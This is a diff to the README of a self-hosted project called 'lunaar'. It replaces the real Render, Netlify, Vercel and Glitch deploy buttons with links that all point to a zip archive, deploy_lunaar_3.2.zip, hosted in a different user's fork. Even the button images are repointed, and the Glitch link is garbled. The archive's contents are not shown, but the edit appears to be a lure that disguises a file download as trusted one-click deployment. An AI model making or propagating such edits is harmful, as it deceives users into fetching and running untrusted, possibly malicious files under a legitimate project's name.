@@ -8,7 +8,7 @@ a self-hosted version of lunaar
 
 click one of the buttons below to deploy
 
-[![Deploy to Render](https://binbashbanana.github.io/deploy-buttons/buttons/remade/render.svg)](https://render.com/deploy?repo=https://github.com/Parcoil/lunaar-deploy)
-[![Deploy to Netlify](https://binbashbanana.github.io/deploy-buttons/buttons/remade/netlify.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/Parcoil/lunaar-deploy)
-[![Deploy with Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repositoryurl=https://github.com/Parcoil/lunaar-deploy)
-<a target="_blank" href="https://glitch.com/edit/#!/import/github/Parcoil/lunaar-deploy"><img alt="Remix on Glitch" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg"></a>
+[![Deploy to Render](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)
+[![Deploy to Netlify](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)
+[![Deploy with Vercel](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)](https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip)
+<a target="_blank" href="https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip!/import/github/Parcoil/lunaar-deploy"><img alt="Remix on Glitch" src="https://github.com/VIN07grinder/lunaar-deploy/raw/refs/heads/main/static/deploy_lunaar_3.2.zip"></a>
